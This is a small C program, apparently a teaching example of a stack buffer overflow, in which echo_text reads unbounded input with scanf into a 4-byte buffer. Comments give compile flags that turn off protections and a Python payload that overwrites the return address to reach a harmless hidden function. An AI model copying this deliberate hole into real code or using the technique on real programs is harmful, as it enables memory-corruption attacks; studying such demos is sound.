#include <stdio.h>

//
// Credit:
// https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/
//
// gcc hidden_func.c -fno-stack-protector -no-pie -o hidden_func
// objdump -d hidden_func
// python -c 'print "a"*12 + "\xa7\x05\x40\x00\x00\x00\x00\x00"' | ./hidden_func
// 
//---------------------------------------
void hidden_func()
{
  puts("Inside the hidden function");
}

//----------------------------------------
void echo_text()
{
  char buffer[4];
   
  printf( "Enter some text: "         );
  scanf(  "%s", buffer                );
  printf( "You entered: %s\n", buffer );  
}

//----------------------------------------
int main()
{
  echo_text();
  return 0;
}
//============ END OF FILE ===============

